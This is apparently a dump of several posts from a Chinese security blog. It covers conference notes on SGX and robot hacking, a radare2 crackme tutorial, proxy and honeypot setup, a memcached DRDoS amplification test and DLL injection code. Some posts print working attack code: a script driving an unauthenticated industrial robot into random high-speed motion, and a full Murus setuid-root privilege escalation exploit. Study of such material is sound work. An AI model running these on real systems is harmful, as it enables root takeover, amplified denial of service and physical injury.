firmware, … Operating systems, hypervisor … 这个在云上（亚马逊，微软的azure）也有应用 但是英特尔没有在SGX’s threat model里包含side-channel attacks（侧信道攻击） Attacks to Intel SGX 那么本身有什么漏洞呢 Controlled Channel Attack [Oakland ‘15] Finer-grained Controlled Channel Attack [USENIX Security ’17] Branch-predictor Attack [USENIX Security ‘17] Dark-ROP [USENIX Security ‘17] (My work!!) CacheZoom [arXiv] 这些都是side-channel attacks（侧信道攻击） Summarizing TEE 基于硬件的TEE和Intel SGX是一种前沿的技术 在不同平台的实现 ARM TrustZone AMD SME/SEV Intel SGX 一个强大的安全机制，但也可能是新的攻击向量（目标） 保护EPC的完整性，用tree结构保存数据的hash，父节点储存child的节点的hash只有硬件黑客才能篡改 但是还是可以缓解硬件黑客 接下来的The Rowhammer Attack（排锤攻击？），不是很懂 Hacking Robots Before Skynet认证绕过 不过 将友好的机器人变为evil机器人 将有摄像头的机器人变为间谍摄像头 未保护的蓝牙适配器 对蓝牙不熟悉，这里说默认的pin是0000（我感觉4位是不是可以爆破了） 还有下面的，通信不用认证？ 未文档化的函数运行远程获取OAuth Access Token 机器人漏洞挖掘 版本信息 缓冲区溢出 Modify the safety.conf file to override all safety general limits,joints limits, boundaries, and safety I/O values. Force a collision in the checksum calculation, and upload the newfile. We need to fake this number since integrators are likely towrite a note with the current checksum value on the hardware, asthis is a common best practice. Restart the robot so the safety configurations are updated by thenew file. Process continuation ! Load new installation file (new safety settings) Move the robot in an arbitrary, dangerous manner by exploiting anauthentication issue on the UR control service. 12345678910111213141516171819s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((HOST, 30002))for x in xrange(50):q = [random.uniform(-2*math.pi, 2*math.pi), \\random.uniform(-2*math.pi, 2*math.pi), \\random.uniform(-2*math.pi, 2*math.pi), \\random.uniform(-2*math.pi, 2*math.pi), \\random.uniform(-2*math.pi, 2*math.pi), \\random.uniform(-2*math.pi, 2*math.pi)] ← joint positionsa = random.uniform(1, 20) ← joint accelerationv = random.uniform(1, 20) ← joint speedpayload = &quot;movej(&quot;+ str(q) + &quot;, a=&quot;+str(a)+&quot;, v=&quot;+str(v)+&quot;)&quot; ← movejointss.send(payload + &quot;\\n&quot;)print &quot;[!] Sent&quot;, payloadtime.sleep(1)data = s.recv(1024)s.close()print(&quot;Received&quot;, repr(data)) 可关闭安全设置 另一款机器，可发消息控制 Vulnerable Research Frameworks: ROS 物理攻击之连接篇 哈哈，插个网线再黑你 还可以用无限鼠标键盘控制（当然要有usb接口） 这个头部后面也有个网口 物理攻击之不安全储存 更恐怖的是供应商的cloud可以黑掉并控制，强大的机器人军队来袭 “杀死机器人” 有些机器人开放了恢复出厂和更新接口，还可以远程调用，还没有校验 云服务之账号劫持 未签名的固件/应用的更新 最后来个汇总吧 机器人被黑的后果 In the homePrivacy issues, human and property damage Businesses &amp; IndustryEspionage（间谍）, human and property damage,corporate/business network compromise Healthcare &amp; MilitarDirect human threats 提升安全性 Security from Day One Factory Restore Secure the Supply Chain（供应链） Secure by Default Education Vulnerability Disclosure Response Invest less in marketing and more in cyber security（少投资于市场营销，多投资于网络安全。） Fuzzing AOSP For the Massesfuzzing目标 focus on Remotely accessibleMedia (audio/video)Parsing code (XML, etc.)FontsWiFi/Bluetooth/Radio Allows for privesc or sandbox escapeGraphicsKernel/DriversFirmware Interfaces Rarely executed == less likely to be tested Android Open Source Project Easier fuzzing with source-level tools Fuzzing userspace: Sanitizers AddressSanitizersource.android.com/devices/tech/debug/asan SanitizerCoverageclang.llvm.org/docs/SanitizerCoverage.html AddressSanitizer (ASAN)Fast memory error detectorTwo parts: Compiler instrumentation Run-time library ASAN can detect: Out-of-bounds accesses to heap, stack and globals Use-after-free Use-after-return (runtime flag ASAN_OPTIONS=detect_stack_use_after_return=1) Use-after-scope (clang flag -fsanitize-address-use-after-scope) Double-free, invalid free Memory leaks (experimental) Fuzzing userspace: libFuzzer Fuzzing Kernelspace: KASAN Fuzzing Kernelspace: KCOV TL;DR: SanitizerCoverage in the Kernel Allows for simple code coverage instrumentation Basic-block level instrumentation Enabled with CONFIG_KCOV Implemented with kernel debugfs extension that collects and exposescoverage per-thread Fuzzing Kernelspace: syzkaller Coverage guided Linux syscall fuzzerSupported in android on pixel devicesRequires a kernel with KASAN and KCOV enabledUses syscall descriptions to generate “programs” that correspond to fuzzing inputs","categories":[],"tags":[{"name":"安全大会","slug":"安全大会","permalink":"https://www.giantbranch.cn/tags/安全大会/"},{"name":"议题","slug":"议题","permalink":"https://www.giantbranch.cn/tags/议题/"},{"name":"记录","slug":"记录","permalink":"https://www.giantbranch.cn/tags/记录/"}]},{"title":"为什么我毕业后还偶尔打打ctf比赛","slug":"为什么我毕业后还偶尔打打ctf比赛","date":"2018-02-06T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2018/02/06/为什么我毕业后还偶尔打打ctf比赛/","link":"","permalink":"https://www.giantbranch.cn/2018/02/06/为什么我毕业后还偶尔打打ctf比赛/","excerpt":"","text":"写这个题目的时候是2017-12-26，拖了很久了。。。。。。，随便写写，写得不好别介意 这个只是偶尔，不过也是都基本是国外的比赛了，现在只关注re跟pwn 这个打比赛也包含刷一下以前的题目，不一定真的就是打那个时间举办的ctf 简单说一下国内外的比赛吧，国内比赛就是无限循环，最多改一下别人国外的题目；而国外比赛相对来说会给你很多惊喜，虽然有些也是常见套路了 其实ctf有价值的逆向和pwn都能给你新的知识和新的思路：比如让你懂得mbr感染，arm64的gadgets的使用，mips的pwn怎么搞等。 此外就是很多工作的国外大佬也在搞这个，上次看到一个CTO和CEO是PPP战队的，有空还搞这个，真的挺有感触的 还有就是之前腾讯到广州大学的一次分享，那个打比赛出身到pwn2own的大佬也强调了ctf的作用，还有少打垃圾比赛 或许还有个原因就是跟师弟师妹一起打，顺便带一下，结果他们还没你积极。。。。。。 大概以后打比赛的次数逐渐减少吧，大概到7月份这样子，之后只会关注一些质量高，ctftime权重比较高的比赛，如34c3ctf，0ctf，seccon ctf，Codegate等，这些比赛真低不错，可以学到知识，可以说是学习效率很高的时候 假如以后有什么新的点子再更新吧 ——————2018.02.06","categories":[],"tags":[{"name":"think","slug":"think","permalink":"https://www.giantbranch.cn/tags/think/"},{"name":"say","slug":"say","permalink":"https://www.giantbranch.cn/tags/say/"}]},{"title":"apache和nginx设置反向代理","slug":"apache和nginx设置反向代理","date":"2018-02-04T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2018/02/04/apache和nginx设置反向代理/","link":"","permalink":"https://www.giantbranch.cn/2018/02/04/apache和nginx设置反向代理/","excerpt":"","text":"apache123a2enmod proxya2enmod proxy_httpa2enmod proxy_connect 之后编辑/etc/apache2/mods-available/proxy.conf 加个这个，或者修改助理里面的proxy 1234&lt;Proxy *&gt; Order allow,deny Allow from all&lt;/Proxy&gt; 设置站点的配置文件，以代理本地3000端口为例，那当我们访问XXXXX.giantbranch.cn就可以访问本地3000端口的网站了 123456789&lt;VirtualHost *:80&gt; ...... ServerName XXXXX.giantbranch.cn ProxyPass / http://127.0.0.1:3000/ ProxyPassReverse / http://127.0.0.1:3000/ ......&lt;/VirtualHost&gt; 最后重启（下面以ubuntu为例） 1service apache2 restart 有些系统可以这样 1systemctl restart apache2 nginx这个就简单多了，直接创建一个站点配置文件，那么访问haha.giantbranch.cn，就可以访问本地的3001端口了 1234567891011server &#123; ...... listen 80; server_name haha.giantbranch.cn; location / &#123; proxy_pass http://localhost:3001; &#125; ......&#125; 当然重启一下 1service nginx restart","categories":[],"tags":[{"name":"apache","slug":"apache","permalink":"https://www.giantbranch.cn/tags/apache/"},{"name":"nginx","slug":"nginx","permalink":"https://www.giantbranch.cn/tags/nginx/"}]},{"title":"简单实践Radare2","slug":"简单实践Radare2","date":"2018-02-02T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/02/02/简单实践Radare2/","link":"","permalink":"https://www.giantbranch.cn/2018/02/02/简单实践Radare2/","excerpt":"","text":"安装与简介123$ git clone https://github.com/radare/radare2$ cd radare2$ sudo sys/install.sh 这个软件的优势应该是开源，支持多架构，多系统 实践rabin2第一个工具rabin2，这个比readelf，file强大 1-I binary info 查看binary的信息 12345678910111213141516171819202122232425262728# rabin2 -I ./intro arch x86binsz 6485bintype elfbits 64canary falseclass ELF64crypto falseendian littlehavecode trueintrp /lib64/ld-linux-x86-64.so.2lang clinenum truelsyms truemachine AMD x86-64 architecturemaxopsz 16minopsz 1nx trueos linuxpcalign 0pic truerelocs truerelro partialrpath NONEstatic falsestripped falsesubsys linuxva true 查看字符串 1-z strings (from data section) 结果： 12# rabin2 -z ./intro 000 0x000006e4 0x000006e4 11 12 (.rodata) ascii Hello World 当然查看更多可以下面这两个 12-zz strings (from raw bins [e bin.rawstr=1])-zzz dump raw strings to stdout (for huge files) r2这个应该是核心工具 启动： 1# r2 ./intro 分析的话可以输入aa，如果想要更详细，可以aaa，或者aaaa 12345# r2 ./intro -- The more &apos;a&apos; you add after &apos;aa&apos; the more analysis steps are executed.[0x00000540]&gt; aa[x] Analyze all flags starting with sym. and entry0 (aa)[0x00000540]&gt; 分析完我们要去看函数，就用s，s代表就是seek，我们操作文件应该用过fseek 我们jmp到main函数 12[0x00000540]&gt; s main[0x0000064a]&gt; 可以看到前面的变了，前面的应该是偏移 当然我们也可以切换回来 12[0x0000064a]&gt; s 0x540[0x00000540]&gt; 但现在我们还是看不到代码，还是命令行，我们可以用v切换为显示模式，代表visual mode，有英文详细名词好记 我们输入v就看到了十六进制的界面了 我们这是可以再用p来切换其他模式，我们可以切花到下面的 1234567891011121314151617181920212223242526272829303132[0x0000064a 19% 512 ./intro]&gt; pd $r @ main ;-- main: / (fcn) sym.main 19 | sym.main (); | ; DATA XREF from 0x0000055d (entry0) | 0x0000064a 55 push rbp | 0x0000064b 4889e5 mov rbp, rsp | 0x0000064e 488d3d8f0000. lea rdi, str.Hello_World ; 0x6e4 ; &quot;Hello World&quot; | 0x00000655 e8d6feffff call sym.imp.puts ;[1] ; int puts(const char *s) | 0x0000065a 90 nop | 0x0000065b 5d pop rbp \\ 0x0000065c c3 ret 0x0000065d 0f1f00 nop dword [rax] / (fcn) sym.__libc_csu_init 101 | sym.__libc_csu_init (); | ; DATA XREF from 0x00000556 (entry0) | 0x00000660 4157 push r15 | 0x00000662 4156 push r14 | 0x00000664 4989d7 mov r15, rdx | 0x00000667 4155 push r13 | 0x00000669 4154 push r12 | 0x0000066b 4c8d256e0720. lea r12, obj.__frame_dummy_init_array_entry ; loc.__init_array_start ; 0x200de0 ; &quot;@\\x06&quot; | 0x00000672 55 push rbp | 0x00000673 488d2d6e0720. lea rbp, obj.__do_global_dtors_aux_fini_array_entry ; loc.__init_array_end ; 0x200de8 | 0x0000067a 53 push rbx | 0x0000067b 4189fd mov r13d, edi | 0x0000067e 4989f6 mov r14, rsi | 0x00000681 4c29e5 sub rbp, r12 | 0x00000684 4883ec08 sub rsp, 8 | 0x00000688 48c1fd03 sar rbp, 3 | 0x0000068c ff1566092000 call qword sym._init ;[2] ; [0x200ff8:8]=0x500 sym._init | 0x00000692 4885ed test rbp, rbp 如果想后退按esc就行 实战一个crackme先看一下信息 12345678910111213141516171819202122232425262728# rabin2 -I ./crackme arch x86binsz 6759bintype elfbits 64canary trueclass ELF64crypto falseendian littlehavecode trueintrp /lib64/ld-linux-x86-64.so.2lang clinenum truelsyms truemachine AMD x86-64 architecturemaxopsz 16minopsz 1nx trueos linuxpcalign 0pic truerelocs truerelro partialrpath NONEstatic falsestripped falsesubsys linuxva true 先运行 123# ./crackme What&apos;s the password? 4324You failed 我们之前用-z查看字符串，我们如果只查看字符串而不看地址什么的 1-qq show less info (no offset/size for -z for ex.) 用-zqq可以显示更少信息 12345678rabin2 -zqq ./crackme What&apos;s the password? radare2CongratulationsWhat&apos;s the second password? What&apos;s the third password? You failedFlag is: r2&#123;%s %s %s&#125;\\n 我们可以猜想radare2就是password 1234# ./crackme What&apos;s the password? radare2CongratulationsWhat&apos;s the second password? 这就是最简单的，不过这还有第二个password呢 我们用r2看看吧 12345678910# r2 ./crackme -- Try pressing the pigeon-shaped button[0x000006f0]&gt; aaa[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze len bytes of instructions for references (aar)[x] Analyze function calls (aac)[x] Use -AA or aaaa to perform additional experimental analysis.[x] Constructing a function name for fcn.* and sym.func.* functions (aan)[0x000006f0]&gt; s main[0x000007fa]&gt; 如果要切换到想ida那样的，就用VV，之后就可以用方向键控制了 我们就可以清晰看到password1了 password2是将我们的输入调用atoi（将字符串转化为数字），之后跟0xf比较 那么我们的输入就是15，通过第二关 123456# ./crackme What&apos;s the password? radare2CongratulationsWhat&apos;s the second password? 15CongratulationsWhat&apos;s the third password? 接下来看看第三关，这个也是调用atoi，这次是0x539 我们是学习，结果不重要，其实这还有个编码转化的工具 base64，hex，raw等都可以，不错 1234567891011121314151617181920212223242526272829303132333435363738394041424344# rax2 -hUsage: rax2 [options] [expr ...] =[base] ; rax2 =10 0x46 -&gt; output in base 10 int -&gt; hex ; rax2 10 hex -&gt; int ; rax2 0xa -int -&gt; hex ; rax2 -77 -hex -&gt; int ; rax2 0xffffffb3 int -&gt; bin ; rax2 b30 int -&gt; ternary ; rax2 t42 bin -&gt; int ; rax2 1010d ternary -&gt; int ; rax2 1010dt float -&gt; hex ; rax2 3.33f hex -&gt; float ; rax2 Fx40551ed8 oct -&gt; hex ; rax2 35o hex -&gt; oct ; rax2 Ox12 (O is a letter) bin -&gt; hex ; rax2 1100011b hex -&gt; bin ; rax2 Bx63 ternary -&gt; hex ; rax2 212t hex -&gt; ternary ; rax2 Tx23 raw -&gt; hex ; rax2 -S &lt; /binfile hex -&gt; raw ; rax2 -s 414141 -l ; append newline to output (for -E/-D/-r/.. -b bin -&gt; str ; rax2 -b 01000101 01110110 -B str -&gt; bin ; rax2 -B hello -d force integer ; rax2 -d 3 -&gt; 3 instead of 0x3 -e swap endianness ; rax2 -e 0x33 -D base64 decode ; -E base64 encode ; -f floating point ; rax2 -f 6.3+2.1 -F stdin slurp code hex ; rax2 -F &lt; shellcode.c -h help ; rax2 -h -k keep base ; rax2 -k 33+3 -&gt; 36 -K randomart ; rax2 -K 0x34 1020304050 -L bin -&gt; hex(bignum) ; rax2 -L 111111111 # 0x1ff -n binary number ; rax2 -n 0x1234 # 34120000 -N binary number ; rax2 -N 0x1234 # \\x34\\x12\\x00\\x00 -r r2 style output ; rax2 -r 0x1234 -s hexstr -&gt; raw ; rax2 -s 43 4a 50 -S raw -&gt; hexstr ; rax2 -S &lt; /bin/ls &gt; ls.hex -t tstamp -&gt; str ; rax2 -t 1234567890 -x hash string ; rax2 -x linux osx -u units ; rax2 -u 389289238 # 317.0M -w signed word ; rax2 -w 16 0xffff -v version ; rax2 -v 那么第三个password就是1337 12# rax2 0x5391337 那最终flag就可以出来了 12345678# ./crackme What&apos;s the password? radare2CongratulationsWhat&apos;s the second password? 15CongratulationsWhat&apos;s the third password? 1337CongratulationsFlag is: r2&#123;radare2 15 1337&#125; referencehttps://medium.com/@jacob16682/reverse-engineering-using-radare2-588775ea38d5https://medium.com/@jacob16682/reverse-engineering-with-radare2-part-2-83b71df7ffe4","categories":[],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://www.giantbranch.cn/tags/逆向/"},{"name":"radare2","slug":"radare2","permalink":"https://www.giantbranch.cn/tags/radare2/"}]},{"title":"Murus 1.4.11 - Local Privilege Escalation 漏洞简析","slug":"Murus 1.4.11 - Local Privilege Escalation 漏洞简析","date":"2018-02-01T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2018/02/01/Murus 1.4.11 - Local Privilege Escalation 漏洞简析/","link":"","permalink":"https://www.giantbranch.cn/2018/02/01/Murus 1.4.11 - Local Privilege Escalation 漏洞简析/","excerpt":"","text":"没有mac的苦逼就直接分析代码了 首先Murus是mac的防火墙，这个东西只要可以以admin权限运行就可以提权了 step1首先我们看到编译一个c程序 1234567891011121314151617181920cat &gt; /tmp/murus411_exp.c &lt;&lt;EOF#include &lt;unistd.h&gt;int main()&#123; setuid(0); seteuid(0); execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-c&quot;,&quot;rm -f /tmp/murus411_exp; /bin/bash&quot;,NULL); return 0;&#125;EOF gcc -o /tmp/murus411_exp /tmp/murus411_exp.cif [ ! $? -eq 0 ] ; then rm -f /tmp/murus411_exp.c echo &quot;failed to compile, dev tools may not be installed&quot; exit 1fi rm -f /tmp/murus411_exp.c 看到这里我们就知道这应该是不正当权限运行程序导致的，先设置当前程序的uid和euid，之后执行/bin/bash 而$? 可以获取上一个命令的退出状态。所谓退出状态，就是上一个命令执行后的返回结果。 成功应该返回0，如果返回不是0说明编译有问题了 step2之后又编译第二个程序 123456789101112131415161718cat &gt; /tmp/murus411_exp2.c &lt;&lt;EOF#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;int main()&#123; setuid(0); seteuid(0); system(&quot;chown root:wheel /tmp/murus411_exp&quot;); system(&quot;chmod 4755 /tmp/murus411_exp&quot;); system(&quot;mv /Applications/Murus.app/Contents/MacOS/Murus.orig /Applications/\\Murus.app/Contents/MacOS/Murus&quot;); execl(&quot;/Applications/Murus.app/Contents/MacOS/Murus&quot;,&quot;Murus&quot;,NULL); return 0;&#125;EOF gcc -o /tmp/murus411_exp2 /tmp/murus411_exp2.crm -f /tmp/murus411_exp2.c 这个就将第一个程序拥有者设置为0，并设置suid位，最后mv Murus.orig并执行 step3查找进程MurusLoader，看看起来了没 12345678while :do ps auxwww |grep &apos;/Applications/Murus.app/Contents/MacOS/MurusLoader&apos; \\ |grep -v grep 1&gt;/dev/null if [ $? -eq 0 ] ; then break fidone step4123mv /Applications/Murus.app/Contents/MacOS/Murus /Applications/Murus.app/\\Contents/MacOS/Murus.origmv /tmp/murus411_exp2 /Applications/Murus.app/Contents/MacOS/Murus 最后将原来的Murus替换为我们的exp2 那么问题就是MurusLoader以root权限执行/Applications/Murus.app/Contents/MacOS/Murus这个程序导致的问题了，这就是关键所在 step5最后再检查下我们的文件的拥有者是不是root，之后就获得了root权限了 123456789101112while :do r=`ls -la /tmp/murus411_exp |grep root` if [ &quot;$r&quot; != &quot;&quot; ] ; then break fi sleep 0.1done echo &quot;kapow&quot; /tmp/murus411_exp 小结其实很多时候不应要利用内核漏洞去提权，这种以不当的权限启动程序的是一个很好的方法，之前分析nsa的工具的时候，很多都是利用这一点，简单方便，何乐而不为呢 有空总结一下提权的各种套路，大家可以提醒一下我 referencehttps://www.exploit-db.com/exploits/43217/","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"},{"name":"本地提权","slug":"本地提权","permalink":"https://www.giantbranch.cn/tags/本地提权/"}]},{"title":"读《如何做好首席安全官 》","slug":"读《如何做好首席安全官 》","date":"2018-02-01T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/02/01/读《如何做好首席安全官 》/","link":"","permalink":"https://www.giantbranch.cn/2018/02/01/读《如何做好首席安全官 》/","excerpt":"","text":"其实还没毕业的时候会有过这个想法，当然现在也有，不然关注这个干嘛，或许以后会变也不一定，或许想去创业，或许只是想一直搞技术，玩出自己想要的就好了。 当时想的是其实比较简单，就是知识面比较广，又有管理能力，那么就可以了。那我们看看作者说得东西，我再去跟进。 业务理解与赋能这个不错的，你对你保护的对象都不了解，你搞毛的安全啊。无论什么东西，只有你了解了，你才能够做得好，我觉得这都是源于一个道理：量变到质变，只有量达到了，质才能发送，了解的量足够多，才能做出成绩来。赋能这个词就用的有点玄乎了，这个我听到的比较多的是那些商业节目，互联网大佬的演讲。“赋能”最早是积极心理学中的一个名词，旨在通过言行、态度、环境的改变给予他人正能量。而其实发展到商业，应该叫赋能授权好点，意思就是授权给企业员工——赋予他们更多额外的权力，或许他们可以创造出更多价值。好像说远了。。。 安全治理与战略规划 战略一致性：信息安全的战略与重点应该与业务的战略、布局、拓展等能力需求保持一直，这肯定要对业务的充分了解了 价值：这个确实，假如一个东西没价值，你花钱做他干嘛，你的工资也是由你的价值决定的，一个基本的价值是让当前公司更安全，业务更有保障，更牛逼的像BAT还可以将自己的安全能力输出， 风险：这个还是安全的问题，直接抄一段：以业务与风险为导向，以威胁为驱动手段，从管理、技术、人的纵深；从业务自身能力、安全风险管控能力、安全监督审计能力的纵深；从业务外延领域、虚拟边界领域、核心能力领域的纵深，进行全面安全风险整合优化，提升感知、管控、处置、迭代能力。 资源投放效率：该找几个人合适，这是一个值得思考的问题，哈哈，上年看到很多一个人的安全建设的文章。 度量评价：这个评价我觉得安全团队内部有个评价，做出的安全贡献，安全能力等评价，另外对其他部门有个评价，这个部门的产品的漏洞数多少，高危几个，中危几个，修复情况，修复效率等，感觉这个会被其他部门挨骂啊。。。。 安全风险管理ISO13335没接触，估计没到那个位置都不会接触了 这个也就只能抄点过来了 参考的方法包括企业全面风险管理、COSO-ERM、ISO31000等国内外最佳实践要求。 本着安全风险以终为始（Begin with the end in mind）的目标，总结了五大常见安全风险目标分类，仅供参考。 核心资产持续业务能力资金相关合规、归零声誉、商誉、品牌 安全技术与架构其实架构以前会觉得是很高大上的东西，因为当年了解到架构师的工资很高 现在觉得的话是你非常了解一个东西，那么你就知道怎么去构建这个东西 安全的话也是：产品的攻击面，每个攻击面的安全怎么设计物理攻击的防御 安全管理这个不熟悉，直接抄点 曾经江湖传闻安全有各种流派，其中有一门为管理标准派，独门秘笈为“BS7799、ISO17799、ISO27001“ 安全管理不简单等同于体系标准，根据公司的情况与管理风格，一个公司安全管理规范可能能够覆盖大部分常见的场景，这样就没有必要马上弄一个文档制度体系。即使是需要构建管理体系，在各个方向上的发力点也是不同的，可以从几个最急迫、最痛的管理诉求开始，如公司账号、权限管理要求、数据保密制度等等，在业务运作与安全管控之间构建一个合适的平衡体系 业务安全与风控业务安全，包括反作弊、防刷单、黑产对抗、账号体系安全、资金交易安全等等 其实业务风控和内部控制也没说什么用处太大的东西 安全运营这个让我想到的是src 这个也是感觉说了很多废话 我自己感觉是将之前设置好的架构什么的落实，漏洞处理落实等等 本地政府、监管理解与法律法规合规这个当然是肯定的，怎么刚也不能和法律，政府刚啊，这样就少了麻烦事了，不就更有心思搞安全了？ 安全审计这个我感觉是安全检查吧，嘻嘻，随便乱说的 代码设审计肯定也算里面 危机管理、安全事件调查与取证这个其实应该在架构设计的时候就是要考虑的，应急响应的演练，方案啥的 组织架构、安全意识与内部安全品牌建设内部安全意识培训？ 打造公司的安全品牌的名声？ 资源管理与使用效率控制设备买了就要用，否则就不买？ referencehttps://www.sec-un.org/%E5%A6%82%E4%BD%95%E5%81%9A%E5%A5%BD%E9%A6%96%E5%B8%AD%E5%AE%89%E5%85%A8%E5%AE%98-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%8E%E6%9E%B6%E6%9E%84%E5%AE%9E%E7%8E%B0/","categories":[],"tags":[{"name":"首席安全官","slug":"首席安全官","permalink":"https://www.giantbranch.cn/tags/首席安全官/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://www.giantbranch.cn/tags/读书笔记/"}]},{"title":"搭建mhn蜜罐管理系统并部署蜜罐","slug":"搭建mhn蜜罐管理系统并部署蜜罐","date":"2018-01-28T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/01/28/搭建mhn蜜罐管理系统并部署蜜罐/","link":"","permalink":"https://www.giantbranch.cn/2018/01/28/搭建mhn蜜罐管理系统并部署蜜罐/","excerpt":"","text":"安装12345sudo apt-get install git -ycd /opt/sudo git clone https://github.com/threatstream/mhn.gitcd mhn/sudo ./install.sh 配置默认就行，邮箱和密码要记住，后面要用 12345678910111213141516===========================================================MHN Configuration===========================================================Do you wish to run in Debug mode?: y/n nSuperuser email: YOUR_EMAIL@YOURSITE.COMSuperuser password: Server base url [&quot;http://XXXXX&quot;]: Honeymap url [&quot;http://XXXXXXXX:3000&quot;]:Mail server address [&quot;localhost&quot;]: Mail server port [25]: Use TLS for email?: y/n nUse SSL for email?: y/n nMail server username [&quot;&quot;]: Mail server password [&quot;&quot;]: Mail default sender [&quot;&quot;]: Path for log file [&quot;XXXXXXXX/mhn.log&quot;]: 之后Splunk和ELK可以不用了 可以看看运行成功没有 12345678910111213user@precise64:/opt/mhn/scripts$ sudo /etc/init.d/nginx status * nginx is runninguser@precise64:/opt/mhn/scripts$ sudo /etc/init.d/supervisor status is runninguser@precise64:/opt/mhn/scripts$ sudo supervisorctl statusgeoloc RUNNING pid 31443, uptime 0:00:12honeymap RUNNING pid 30826, uptime 0:08:54hpfeeds-broker RUNNING pid 10089, uptime 0:36:42mhn-celery-beat RUNNING pid 29909, uptime 0:18:41mhn-celery-worker RUNNING pid 29910, uptime 0:18:41mhn-collector RUNNING pid 7872, uptime 0:18:41mhn-uwsgi RUNNING pid 29911, uptime 0:18:41mnemosyne RUNNING pid 28173, uptime 0:30:08 在另一机器部署蜜罐非常简单 登录MHN server（就是上面我们配置好的机器，80端口就好） 点击 “Deploy” 选择一种蜜罐 (比如 “Ubuntu Dionaea”). 复制部署命令 登录到要部署的蜜罐服务器并用root用户运行 效果","categories":[],"tags":[{"name":"蜜罐","slug":"蜜罐","permalink":"https://www.giantbranch.cn/tags/蜜罐/"},{"name":"mhn","slug":"mhn","permalink":"https://www.giantbranch.cn/tags/mhn/"}]},{"title":"简单实践传说中的2T/S的DRDoS","slug":"简单实践传说中的2T每秒的DRDoS","date":"2018-01-22T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/01/22/简单实践传说中的2T每秒的DRDoS/","link":"","permalink":"https://www.giantbranch.cn/2018/01/22/简单实践传说中的2T每秒的DRDoS/","excerpt":"","text":"说一下DRDos我们知道Dos是拒绝服务攻击，DDos是分布式的，那么这个R是反射的意思，DNS放大的拒绝服务就是这种,这次我们实践的是memcache的DRDos，当然我们只是看看发送和返回的差异 这个实验基于： memcache无认证（有认证基本没戏啊） udp的源ip可伪造性 测试环境一个装了memcache的vps 1apt install memcached 启动服务（其实默认端口是11211，我用11111吧） 1memcached -p 11111 -m 64m -vv -u memcache 一个用于测试的vps，安装memcache python模块 1pip install python-memcached 实验1234567891011121314&gt;&gt;&gt; import memcache&gt;&gt;&gt; mc = memcache.Client([&apos;127.0.0.1:xxxx&apos;],debug=True)&gt;&gt;&gt; mc.add(&apos;giantbranch&apos;,&quot;giantbranch&quot;*1000)True&gt;&gt;&gt; mc.add(&apos;giant1&apos;,&quot;giantbranch&quot;*10000)True&gt;&gt;&gt; mc.add(&apos;giant2&apos;,&quot;giantbranch&quot;*20000)True&gt;&gt;&gt; mc.add(&apos;giant3&apos;,&quot;giantbranch&quot;*50000)True&gt;&gt;&gt; mc.add(&apos;giant4&apos;,&quot;giantbranch&quot;*90000)True&gt;&gt;&gt; mc.set(&apos;giantbranch&apos;, &quot;giantbranch&quot;,9999999)True 真正的实验来了 可以看到我们发送55个字节，收到1459480字节 这一个服务就那么厉害，如果更多就不得了 当然得不用认证的才能这么大威力了 自己写的scapy伪造ip的测试问题，不知道为啥目标服务器没收到数据包 referencesDeluge – How to generate 2TB per seconds reflection DDoS data flow via a family network 附录记录下实际的memcache的命令吧 mc.add(‘giant1’,”giantbranch”*10000) 实际服务器执行如下，成功返回STORED 12&lt;31 add giant1 0 0 110000 &gt;31 STORED mc.set(‘giantbranch’, “giantbranch”,9999999) 12&lt;31 set giantbranch 0 9999999 11 &gt;31 STORED","categories":[],"tags":[{"name":"DDos","slug":"DDos","permalink":"https://www.giantbranch.cn/tags/DDos/"},{"name":"DRDos","slug":"DRDos","permalink":"https://www.giantbranch.cn/tags/DRDos/"},{"name":"memcache","slug":"memcache","permalink":"https://www.giantbranch.cn/tags/memcache/"}]},{"title":"使用远程线程注入DLL","slug":"使用远程线程注入DLL","date":"2018-01-21T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2018/01/21/使用远程线程注入DLL/","link":"","permalink":"https://www.giantbranch.cn/2018/01/21/使用远程线程注入DLL/","excerpt":"","text":"总览注入 OpenProcess() VirtualAllocEx() WriteProcessMemory() GetProcessAddress() -&gt; LoadLibrary CreateRemoteThread() -&gt; LoadLibrary() -&gt; DLLMain() 注出 CreateToolhelp32Snapshot() Module32FirstW Module32NextW OpenProcess() GetProcessAddress -&gt; FreeLibrary() CreateRemoteThread() -&gt; FreeLibrary() 注入123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566BOOL WINAPI injectLibW(DWORD pid, PCWSTR path) &#123; BOOL bRet = FALSE; HANDLE hProcess = NULL, hThread = NULL; PCWSTR pszLibFileRemote = NULL; CString test; //hProcess = OpenProcess( // PROCESS_QUERY_INFORMATION | // PROCESS_CREATE_THREAD | // PROCESS_VM_OPERATION | // PROCESS_VM_WRITE, // FALSE, // pid //); hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid); if (hProcess == NULL) return FALSE; int pathLen = lstrlenW(path) + 1; int pathByteNum = pathLen * sizeof(wchar_t); pszLibFileRemote = (PCWSTR)VirtualAllocEx(hProcess, NULL, pathByteNum, MEM_COMMIT, PAGE_READWRITE); if (pszLibFileRemote == NULL) return FALSE; if (!WriteProcessMemory(hProcess, (LPVOID)pszLibFileRemote, path, pathByteNum, NULL)) return FALSE; PTHREAD_START_ROUTINE pLoadLib = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(_T(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;); if (pLoadLib == NULL) return FALSE; 